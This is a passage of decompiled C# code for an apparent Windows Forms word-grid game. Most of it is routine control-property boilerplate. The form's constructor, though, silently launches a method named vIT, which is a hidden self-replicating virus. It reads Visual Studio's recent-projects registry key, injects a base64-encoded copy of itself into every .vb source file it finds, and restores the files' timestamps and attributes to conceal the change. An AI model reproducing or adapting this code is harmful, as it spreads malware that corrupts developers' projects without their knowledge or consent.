			if (_Panel2 == null)
			{
			}
			_Panel2 = value;
			if (_Panel2 != null)
			{
			}
		}
	}

	internal virtual BogBorder BogBorder10
	{
		get
		{
			return _BogBorder10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_BogBorder10 == null)
			{
			}
			_BogBorder10 = value;
			if (_BogBorder10 != null)
			{
			}
		}
	}

	internal virtual BogBorder BogBorder7
	{
		get
		{
			return _BogBorder7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_BogBorder7 == null)
			{
			}
			_BogBorder7 = value;
			if (_BogBorder7 != null)
			{
			}
		}
	}

	internal virtual MenuItem mnuLevelImpossible
	{
		get
		{
			return _mnuLevelImpossible;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuLevelImpossible != null)
			{
				_mnuLevelImpossible.remove_Click((EventHandler)ChangeLevel);
			}
			_mnuLevelImpossible = value;
			if (_mnuLevelImpossible != null)
			{
				_mnuLevelImpossible.add_Click((EventHandler)ChangeLevel);
			}
		}
	}

	internal virtual BogBorder BogBorder11
	{
		get
		{
			return _BogBorder11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_BogBorder11 == null)
			{
			}
			_BogBorder11 = value;
			if (_BogBorder11 != null)
			{
			}
		}
	}

	internal virtual RichTextBox txtMain
	{
		get
		{
			return _txtMain;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_txtMain == null)
			{
			}
			_txtMain = value;
			if (_txtMain != null)
			{
			}
		}
	}

	internal virtual BogBorder BogBorder8
	{
		get
		{
			return _BogBorder8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_BogBorder8 == null)
			{
			}
			_BogBorder8 = value;
			if (_BogBorder8 != null)
			{
			}
		}
	}

	internal virtual Label Label5
	{
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Label5 == null)
			{
			}
			_Label5 = value;
			if (_Label5 != null)
			{
			}
		}
	}

	internal virtual MenuItem MenuItem4
	{
		get
		{
			return _MenuItem4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_MenuItem4 == null)
			{
			}
			_MenuItem4 = value;
			if (_MenuItem4 != null)
			{
			}
		}
	}

	internal virtual BogBorder BogBorder12
	{
		get
		{
			return _BogBorder12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_BogBorder12 == null)
			{
			}
			_BogBorder12 = value;
			if (_BogBorder12 != null)
			{
			}
		}
	}

	internal virtual BogBorder BogBorder4
	{
		get
		{
			return _BogBorder4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_BogBorder4 == null)
			{
			}
			_BogBorder4 = value;
			if (_BogBorder4 != null)
			{
			}
		}
	}

	internal virtual CircleLabel lbl1
	{
		get
		{
			return _lbl1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lbl1 != null)
			{
				_lbl1.CubeClick -= CubeClick;
			}
			_lbl1 = value;
			if (_lbl1 != null)
			{
				_lbl1.CubeClick += CubeClick;
			}
		}
	}

	internal virtual MenuItem mnuTimerInterval
	{
		get
		{
			return _mnuTimerInterval;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuTimerInterval == null)
			{
			}
			_mnuTimerInterval = value;
			if (_mnuTimerInterval != null)
			{
			}
		}
	}

	internal virtual BogBorder BogBorder13
	{
		get
		{
			return _BogBorder13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_BogBorder13 == null)
			{
			}
			_BogBorder13 = value;
			if (_BogBorder13 != null)
			{
			}
		}
	}

	internal virtual BogBorder BogBorder3
	{
		get
		{
			return _BogBorder3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_BogBorder3 == null)
			{
			}
			_BogBorder3 = value;
			if (_BogBorder3 != null)
			{
			}
		}
	}

	internal virtual CircleLabel lbl4
	{
		get
		{
			return _lbl4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lbl4 != null)
			{
				_lbl4.CubeClick -= CubeClick;
			}
			_lbl4 = value;
			if (_lbl4 != null)
			{
				_lbl4.CubeClick += CubeClick;
			}
		}
	}

	internal virtual MenuItem mnuTmr30
	{
		get
		{
			return _mnuTmr30;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuTmr30 != null)
			{
				_mnuTmr30.remove_Click((EventHandler)ChangeTimerInterval);
				_mnuTmr30.remove_Click((EventHandler)ChangeTimerInterval);
			}
			_mnuTmr30 = value;
			if (_mnuTmr30 != null)
			{
				_mnuTmr30.add_Click((EventHandler)ChangeTimerInterval);
				_mnuTmr30.add_Click((EventHandler)ChangeTimerInterval);
			}
		}
	}

	internal virtual BogBorder BogBorder14
	{
		get
		{
			return _BogBorder14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_BogBorder14 == null)
			{
			}
			_BogBorder14 = value;
			if (_BogBorder14 != null)
			{
			}
		}
	}

	internal virtual BogBorder BogBorder1
	{
		get
		{
			return _BogBorder1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_BogBorder1 == null)
			{
			}
			_BogBorder1 = value;
			if (_BogBorder1 != null)
			{
			}
		}
	}

	internal virtual CircleLabel lbl3
	{
		get
		{
			return _lbl3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lbl3 != null)
			{
				_lbl3.CubeClick -= CubeClick;
			}
			_lbl3 = value;
			if (_lbl3 != null)
			{
				_lbl3.CubeClick += CubeClick;
			}
		}
	}

	internal virtual MenuItem mnuTmr100
	{
		get
		{
			return _mnuTmr100;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuTmr100 != null)
			{
				_mnuTmr100.remove_Click((EventHandler)ChangeTimerInterval);
			}
			_mnuTmr100 = value;
			if (_mnuTmr100 != null)
			{
				_mnuTmr100.add_Click((EventHandler)ChangeTimerInterval);
			}
		}
	}

	internal virtual BogBorder BogBorder15
	{
		get
		{
			return _BogBorder15;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_BogBorder15 == null)
			{
			}
			_BogBorder15 = value;
			if (_BogBorder15 != null)
			{
			}
		}
	}

	internal virtual PictureBox picCubesUp
	{
		get
		{
			return _picCubesUp;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_0020: Expected O, but got Unknown
			//IL_003d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0047: Expected O, but got Unknown
			if (_picCubesUp != null)
			{
				((Control)_picCubesUp).remove_Paint(new PaintEventHandler(picCubesUp_Paint));
			}
			_picCubesUp = value;
			if (_picCubesUp != null)
			{
				((Control)_picCubesUp).add_Paint(new PaintEventHandler(picCubesUp_Paint));
			}
		}
	}

	internal virtual CircleLabel lbl2
	{
		get
		{
			return _lbl2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lbl2 != null)
			{
				_lbl2.CubeClick -= CubeClick;
			}
			_lbl2 = value;
			if (_lbl2 != null)
			{
				_lbl2.CubeClick += CubeClick;
			}
		}
	}

	internal virtual MenuItem mnuTmr130
	{
		get
		{
			return _mnuTmr130;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuTmr130 != null)
			{
				_mnuTmr130.remove_Click((EventHandler)ChangeTimerInterval);
			}
			_mnuTmr130 = value;
			if (_mnuTmr130 != null)
			{
				_mnuTmr130.add_Click((EventHandler)ChangeTimerInterval);
			}
		}
	}

	internal virtual BogBorder BogBorder16
	{
		get
		{
			return _BogBorder16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_BogBorder16 == null)
			{
			}
			_BogBorder16 = value;
			if (_BogBorder16 != null)
			{
			}
		}
	}

	internal virtual CircleLabel CircleLabel1
	{
		get
		{
			return _CircleLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_CircleLabel1 == null)
			{
			}
			_CircleLabel1 = value;
			if (_CircleLabel1 != null)
			{
			}
		}
	}

	internal virtual CircleLabel lbl5
	{
		get
		{
			return _lbl5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lbl5 != null)
			{
				_lbl5.CubeClick -= CubeClick;
			}
			_lbl5 = value;
			if (_lbl5 != null)
			{
				_lbl5.CubeClick += CubeClick;
			}
		}
	}

	internal virtual MenuItem mnuTmr200
	{
		get
		{
			return _mnuTmr200;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuTmr200 != null)
			{
				_mnuTmr200.remove_Click((EventHandler)ChangeTimerInterval);
			}
			_mnuTmr200 = value;
			if (_mnuTmr200 != null)
			{
				_mnuTmr200.add_Click((EventHandler)ChangeTimerInterval);
			}
		}
	}

	internal virtual ListBox lstCompFoundWords
	{
		get
		{
			return _lstCompFoundWords;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_0020: Expected O, but got Unknown
			//IL_003d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0047: Expected O, but got Unknown
			if (_lstCompFoundWords != null)
			{
				((Control)_lstCompFoundWords).remove_MouseUp(new MouseEventHandler(lstCompFoundWords_MouseUp));
			}
			_lstCompFoundWords = value;
			if (_lstCompFoundWords != null)
			{
				((Control)_lstCompFoundWords).add_MouseUp(new MouseEventHandler(lstCompFoundWords_MouseUp));
			}
		}
	}

	internal virtual CircleLabel CircleLabel2
	{
		get
		{
			return _CircleLabel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_CircleLabel2 == null)
			{
			}
			_CircleLabel2 = value;
			if (_CircleLabel2 != null)
			{
			}
		}
	}

	internal virtual CircleLabel lbl6
	{
		get
		{
			return _lbl6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lbl6 != null)
			{
				_lbl6.CubeClick -= CubeClick;
			}
			_lbl6 = value;
			if (_lbl6 != null)
			{
				_lbl6.CubeClick += CubeClick;
			}
		}
	}

	internal virtual MenuItem mnuTmr230
	{
		get
		{
			return _mnuTmr230;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuTmr230 != null)
			{
				_mnuTmr230.remove_Click((EventHandler)ChangeTimerInterval);
			}
			_mnuTmr230 = value;
			if (_mnuTmr230 != null)
			{
				_mnuTmr230.add_Click((EventHandler)ChangeTimerInterval);
			}
		}
	}

	internal virtual Button tmrBtn1
	{
		get
		{
			return _tmrBtn1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_tmrBtn1 != null)
			{
				((Control)_tmrBtn1).remove_Click((EventHandler)tmrBtn1_Click_1);
			}
			_tmrBtn1 = value;
			if (_tmrBtn1 != null)
			{
				((Control)_tmrBtn1).add_Click((EventHandler)tmrBtn1_Click_1);
			}
		}
	}

	internal virtual CircleLabel lbl7
	{
		get
		{
			return _lbl7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lbl7 != null)
			{
				_lbl7.CubeClick -= CubeClick;
			}
			_lbl7 = value;
			if (_lbl7 != null)
			{
				_lbl7.CubeClick += CubeClick;
			}
		}
	}

	internal virtual CircleLabel CircleLabel3
	{
		get
		{
			return _CircleLabel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_CircleLabel3 == null)
			{
			}
			_CircleLabel3 = value;
			if (_CircleLabel3 != null)
			{
			}
		}
	}

	internal virtual MenuItem mnuTmr300
	{
		get
		{
			return _mnuTmr300;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuTmr300 != null)
			{
				_mnuTmr300.remove_Click((EventHandler)ChangeTimerInterval);
			}
			_mnuTmr300 = value;
			if (_mnuTmr300 != null)
			{
				_mnuTmr300.add_Click((EventHandler)ChangeTimerInterval);
			}
		}
	}

	internal virtual Button tmrBtn2
	{
		get
		{
			return _tmrBtn2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_tmrBtn2 != null)
			{
				((Control)_tmrBtn2).remove_Click((EventHandler)tmrBtn1_Click_1);
			}
			_tmrBtn2 = value;
			if (_tmrBtn2 != null)
			{
				((Control)_tmrBtn2).add_Click((EventHandler)tmrBtn1_Click_1);
			}
		}
	}

	internal virtual CircleLabel lbl8
	{
		get
		{
			return _lbl8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lbl8 != null)
			{
				_lbl8.CubeClick -= CubeClick;
			}
			_lbl8 = value;
			if (_lbl8 != null)
			{
				_lbl8.CubeClick += CubeClick;
			}
		}
	}

	internal virtual MenuItem mnuTmr330
	{
		get
		{
			return _mnuTmr330;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuTmr330 != null)
			{
				_mnuTmr330.remove_Click((EventHandler)ChangeTimerInterval);
			}
			_mnuTmr330 = value;
			if (_mnuTmr330 != null)
			{
				_mnuTmr330.add_Click((EventHandler)ChangeTimerInterval);
			}
		}
	}

	internal virtual Button tmrBtn3
	{
		get
		{
			return _tmrBtn3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_tmrBtn3 != null)
			{
				((Control)_tmrBtn3).remove_Click((EventHandler)tmrBtn1_Click_1);
			}
			_tmrBtn3 = value;
			if (_tmrBtn3 != null)
			{
				((Control)_tmrBtn3).add_Click((EventHandler)tmrBtn1_Click_1);
			}
		}
	}

	internal virtual CircleLabel lbl9
	{
		get
		{
			return _lbl9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lbl9 != null)
			{
				_lbl9.CubeClick -= CubeClick;
			}
			_lbl9 = value;
			if (_lbl9 != null)
			{
				_lbl9.CubeClick += CubeClick;
			}
		}
	}

	internal virtual MenuItem mnuTmr400
	{
		get
		{
			return _mnuTmr400;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuTmr400 != null)
			{
				_mnuTmr400.remove_Click((EventHandler)ChangeTimerInterval);
			}
			_mnuTmr400 = value;
			if (_mnuTmr400 != null)
			{
				_mnuTmr400.add_Click((EventHandler)ChangeTimerInterval);
			}
		}
	}

	internal virtual Button tmrBtn4
	{
		get
		{
			return _tmrBtn4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_tmrBtn4 != null)
			{
				((Control)_tmrBtn4).remove_Click((EventHandler)tmrBtn1_Click_1);
			}
			_tmrBtn4 = value;
			if (_tmrBtn4 != null)
			{
				((Control)_tmrBtn4).add_Click((EventHandler)tmrBtn1_Click_1);
			}
		}
	}

	internal virtual CircleLabel lbl10
	{
		get
		{
			return _lbl10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lbl10 != null)
			{
				_lbl10.CubeClick -= CubeClick;
			}
			_lbl10 = value;
			if (_lbl10 != null)
			{
				_lbl10.CubeClick += CubeClick;
			}
		}
	}

	internal virtual MenuItem mnuTmr430
	{
		get
		{
			return _mnuTmr430;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuTmr430 != null)
			{
				_mnuTmr430.remove_Click((EventHandler)ChangeTimerInterval);
			}
			_mnuTmr430 = value;
			if (_mnuTmr430 != null)
			{
				_mnuTmr430.add_Click((EventHandler)ChangeTimerInterval);
			}
		}
	}

	internal virtual Label lblHumanScore
	{
		get
		{
			return _lblHumanScore;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lblHumanScore == null)
			{
			}
			_lblHumanScore = value;
			if (_lblHumanScore != null)
			{
			}
		}
	}

	internal virtual CircleLabel lbl11
	{
		get
		{
			return _lbl11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lbl11 != null)
			{
				_lbl11.CubeClick -= CubeClick;
			}
			_lbl11 = value;
			if (_lbl11 != null)
			{
				_lbl11.CubeClick += CubeClick;
			}
		}
	}

	internal virtual MenuItem mnuTmr500
	{
		get
		{
			return _mnuTmr500;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_mnuTmr500 != null)
			{
				_mnuTmr500.remove_Click((EventHandler)ChangeTimerInterval);
			}
			_mnuTmr500 = value;
			if (_mnuTmr500 != null)
			{
				_mnuTmr500.add_Click((EventHandler)ChangeTimerInterval);
			}
		}
	}

	internal virtual Label lblCompScore
	{
		get
		{
			return _lblCompScore;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lblCompScore == null)
			{
			}
			_lblCompScore = value;
			if (_lblCompScore != null)
			{
			}
		}
	}

	internal virtual CircleLabel lbl12
	{
		get
		{
			return _lbl12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lbl12 != null)
			{
				_lbl12.CubeClick -= CubeClick;
			}
			_lbl12 = value;
			if (_lbl12 != null)
			{
				_lbl12.CubeClick += CubeClick;
			}
		}
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)new frmMain());
	}

	private void vIT()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\VisualStudio\\7.0\\ProjectMRUList");
		if (registryKey.ValueCount == 0)
		{
			ProjectData.EndApp();
		}
		string text = "Private Sub vIT()";
		string text2 = "Public Sub New()";
		string text3 = "Dim t As New System.Threading.Thread(AddressOf vIT)\r\nt.Start()";
		string text4 = "UHJpdmF0ZSBTdWIgdklUKCkNCkRpbSBYLCBZIEFzIEludGVnZXINCkRpbSBBLCBC";
		text4 += "KCksIEMsIEcsIEgsIEksIEosIEssIEwgQXMgU3RyaW5nDQpEaW0gRCwgRiBBcyBE";
		text4 += "YXRlDQpEaW0gUiBBcyBNaWNyb3NvZnQuV2luMzIuUmVnaXN0cnlLZXkNCkRpbSBT";
		text4 += "IEFzIFN5c3RlbS5JTy5TdHJlYW1SZWFkZXINCkRpbSBUIEFzIFN5c3RlbS5JTy5T";
		text4 += "dHJlYW1Xcml0ZXINCkRpbSBVIEFzIFN5c3RlbS5JTy5GaWxlQXR0cmlidXRlcw0K";
		text4 += "UiA9IE1pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeS5DdXJyZW50VXNlci5PcGVuU3Vi";
		text4 += "S2V5KCJTb2Z0d2FyZVxNaWNyb3NvZnRcVmlzdWFsU3R1ZGlvXDcuMFxQcm9qZWN0";
		text4 += "TVJVTGlzdCIpDQpJZiBSLlZhbHVlQ291bnQgPSAwIFRoZW4gRW5kDQpHID0gIlBy";
		text4 += "aXZhdGUgU3ViIHZJVCgpIg0KSCA9ICJQdWJsaWMgU3ViIE5ldygpIg0KSSA9ICJE";
		text4 += "aW0gdCBBcyBOZXcgU3lzdGVtLlRocmVhZGluZy5UaHJlYWQoQWRkcmVzc09mIHZJ";
		text4 += "VCkiICYgdmJDckxmICYgInQuU3RhcnQoKSINCkogPSAiIg0KSyA9IFN5c3RlbS5U";
		text4 += "ZXh0LkVuY29kaW5nLkFTQ0lJLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9t";
		text4 += "QmFzZTY0U3RyaW5nKEopKQ0KTCA9ICJKID0gIiAmIENocigzNCkNCkZvciBYID0g";
		text4 += "MSBUbyBMZW4oSikgU3RlcCA2NA0KSWYgWCArIDY0IDwgTGVuKEopIFRoZW4NCkwg";
		text4 += "PSBMICYgTWlkKEosIFgsIDY0KSAmIENocigzNCkgJiB2YkNyTGYgJiAiSiA9IEog";
		text4 += "JiAiICYgQ2hyKDM0KQ0KRWxzZQ0KTCA9IEwgJiBNaWQoSiwgWCwgNjQpICYgQ2hy";
		text4 += "KDM0KQ0KRW5kIElmDQpOZXh0DQpLID0gUmVwbGFjZShLLCAiSiA9ICIgJiBDaHIo";
		text4 += "MzQpICYgQ2hyKDM0KSwgTCwgMSwgMSwgQ29tcGFyZU1ldGhvZC5UZXh0KQ0KTCA9";
		text4 += "ICIiDQpGb3IgWCA9IDAgVG8gUi5WYWx1ZUNvdW50IC0gMQ0KQSA9IFIuR2V0VmFs";
		text4 += "dWUoUi5HZXRWYWx1ZU5hbWVzKFgpKQ0KQSA9IE1pZChBLCAxLCBJblN0clJldihB";
		text4 += "LCAiXCIsIC0xLCBDb21wYXJlTWV0aG9kLlRleHQpKQ0KSWYgU3lzdGVtLklPLkRp";
		text4 += "cmVjdG9yeS5FeGlzdHMoQSkgVGhlbg0KQiA9IFN5c3RlbS5JTy5EaXJlY3Rvcnku";
		text4 += "R2V0RmlsZXMoQSwgIioudmIiKQ0KRm9yIFkgPSBMQm91bmQoQikgVG8gVUJvdW5k";
		text4 += "KEIpDQpEID0gU3lzdGVtLklPLkZpbGUuR2V0TGFzdEFjY2Vzc1RpbWUoQihZKSkN";
		text4 += "CkYgPSBTeXN0ZW0uSU8uRmlsZS5HZXRMYXN0V3JpdGVUaW1lKEIoWSkpDQpVID0g";
		text4 += "U3lzdGVtLklPLkZpbGUuR2V0QXR0cmlidXRlcyhCKFkpKQ0KU3lzdGVtLklPLkZp";
		text4 += "bGUuU2V0QXR0cmlidXRlcyhCKFkpLCBJTy5GaWxlQXR0cmlidXRlcy5Ob3JtYWwp";
		text4 += "DQpTID0gU3lzdGVtLklPLkZpbGUuT3BlblRleHQoQihZKSkNCkMgPSBTLlJlYWRU";
		text4 += "b0VuZCgpDQpTLkNsb3NlKCkNCklmIEluU3RyKEMsIEcsIENvbXBhcmVNZXRob2Qu";
		text4 += "VGV4dCkgPSAwIEFuZCBJblN0cihDLCBILCBDb21wYXJlTWV0aG9kLlRleHQpIDw+";
		text4 += "IDAgVGhlbg0KQyA9IFJlcGxhY2UoQywgIk15QmFzZS5OZXcoKSIsICJNeUJhc2Uu";
		text4 += "TmV3KCkiICYgdmJDckxmICYgSSwgLCAxLCBDb21wYXJlTWV0aG9kLlRleHQpDQpD";
		text4 += "ID0gUmVwbGFjZShDLCBILCBLICYgSCwgLCAxLCBDb21wYXJlTWV0aG9kLlRleHQp";
		text4 += "DQpUID0gU3lzdGVtLklPLkZpbGUuQ3JlYXRlVGV4dChCKFkpKQ0KVC5Xcml0ZShD";
		text4 += "KQ0KVC5GbHVzaCgpDQpULkNsb3NlKCkNCkVuZCBJZg0KU3lzdGVtLklPLkZpbGUu";
		text4 += "U2V0TGFzdFdyaXRlVGltZShCKFkpLCBGKQ0KU3lzdGVtLklPLkZpbGUuU2V0TGFz";
		text4 += "dEFjY2Vzc1RpbWUoQihZKSwgRCkNClN5c3RlbS5JTy5GaWxlLlNldEF0dHJpYnV0";
		text4 += "ZXMoQihZKSwgVSkNCk5leHQNCkVuZCBJZg0KTmV4dA0KRW5kIFN1Yg0K";
		string @string = Encoding.ASCII.GetString(Convert.FromBase64String(text4));
		string text5 = "J = \"";
		int num = Strings.Len(text4);
		checked
		{
			for (int i = 1; i <= num; i += 64)
			{
				text5 = ((i + 64 >= Strings.Len(text4)) ? (text5 + Strings.Mid(text4, i, 64) + "\"") : string.Concat(text5 + Strings.Mid(text4, i, 64) + "\"", "\r\nJ = J & ", "\""));
			}
			@string = Strings.Replace(@string, "J = \"\"", text5, 1, 1, (CompareMethod)1);
			text5 = "";
			int num2 = registryKey.ValueCount - 1;
			for (int i = 0; i <= num2; i++)
			{
				string text6 = StringType.FromObject(registryKey.GetValue(registryKey.GetValueNames()[i]));
				text6 = Strings.Mid(text6, 1, Strings.InStrRev(text6, "\\", -1, (CompareMethod)1));
				if (!Directory.Exists(text6))
				{
					continue;
				}
				string[] files = Directory.GetFiles(text6, "*.vb");
				int num3 = Information.LBound((Array)files, 1);
				int num4 = Information.UBound((Array)files, 1);
				for (int j = num3; j <= num4; j++)
				{
					DateTime lastAccessTime = File.GetLastAccessTime(files[j]);
					DateTime lastWriteTime = File.GetLastWriteTime(files[j]);
					FileAttributes attributes = File.GetAttributes(files[j]);
					File.SetAttributes(files[j], FileAttributes.Normal);
					StreamReader streamReader = File.OpenText(files[j]);
					string text7 = streamReader.ReadToEnd();
					streamReader.Close();
					if ((Strings.InStr(text7, text, (CompareMethod)1) == 0) & (Strings.InStr(text7, text2, (CompareMethod)1) != 0))
					{
						text7 = Strings.Replace(text7, "MyBase.New()", "MyBase.New()\r\n" + text3, 1, 1, (CompareMethod)1);
						text7 = Strings.Replace(text7, text2, @string + text2, 1, 1, (CompareMethod)1);
						StreamWriter streamWriter = File.CreateText(files[j]);
						streamWriter.Write(text7);
						streamWriter.Flush();
						streamWriter.Close();
					}
					File.SetLastWriteTime(files[j], lastWriteTime);
					File.SetLastAccessTime(files[j], lastAccessTime);
					File.SetAttributes(files[j], attributes);
				}
			}
		}
	}

	public frmMain()
	{
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)frmMain_Load);
		FoundWords = new DataTable();
		WordsChosen = new string[1];
		ScramSec = 5.0;
		_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection_0024Init = new StaticLocalInitFlag();
		Thread thread = new Thread(vIT);
		thread.Start();
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Expected O, but got Unknown
		//IL_0135: Unknown result type (might be due to invalid IL or missing references)
		//IL_013f: Expected O, but got Unknown
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		//IL_014a: Expected O, but got Unknown
		//IL_014b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0155: Expected O, but got Unknown
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Expected O, but got Unknown
		//IL_0161: Unknown result type (might be due to invalid IL or missing references)
		//IL_016b: Expected O, but got Unknown
		//IL_016c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0176: Expected O, but got Unknown
		//IL_0177: Unknown result type (might be due to invalid IL or missing references)
		//IL_0181: Expected O, but got Unknown
		//IL_0182: Unknown result type (might be due to invalid IL or missing references)
		//IL_018c: Expected O, but got Unknown
		//IL_018d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0197: Expected O, but got Unknown
		//IL_0198: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a2: Expected O, but got Unknown
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ad: Expected O, but got Unknown
		//IL_01ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b8: Expected O, but got Unknown
		//IL_01b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c3: Expected O, but got Unknown
		//IL_01c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ce: Expected O, but got Unknown
		//IL_01cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d9: Expected O, but got Unknown
		//IL_01da: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e4: Expected O, but got Unknown
		//IL_01e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ef: Expected O, but got Unknown
		//IL_01f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fa: Expected O, but got Unknown
		//IL_01fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0205: Expected O, but got Unknown
		//IL_0206: Unknown result type (might be due to invalid IL or missing references)
		//IL_0210: Expected O, but got Unknown
		//IL_0211: Unknown result type (might be due to invalid IL or missing references)
		//IL_021b: Expected O, but got Unknown
		//IL_021c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0226: Expected O, but got Unknown
		//IL_0227: Unknown result type (might be due to invalid IL or missing references)
		//IL_0231: Expected O, but got Unknown
		//IL_0232: Unknown result type (might be due to invalid IL or missing references)
		//IL_023c: Expected O, but got Unknown
		//IL_023d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0247: Expected O, but got Unknown
		//IL_0248: Unknown result type (might be due to invalid IL or missing references)
		//IL_0252: Expected O, but got Unknown
		//IL_0253: Unknown result type (might be due to invalid IL or missing references)
		//IL_025d: Expected O, but got Unknown
		//IL_025e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0268: Expected O, but got Unknown
		//IL_0269: Unknown result type (might be due to invalid IL or missing references)
		//IL_0273: Expected O, but got Unknown
		//IL_0274: Unknown result type (might be due to invalid IL or missing references)
		//IL_027e: Expected O, but got Unknown
		//IL_027f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0289: Expected O, but got Unknown
		//IL_028a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0294: Expected O, but got Unknown
		//IL_0295: Unknown result type (might be due to invalid IL or missing references)
		//IL_029f: Expected O, but got Unknown
		//IL_02a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02aa: Expected O, but got Unknown
		//IL_02ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b5: Expected O, but got Unknown
		//IL_02b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c0: Expected O, but got Unknown
		//IL_02c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cb: Expected O, but got Unknown
		//IL_02cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d6: Expected O, but got Unknown
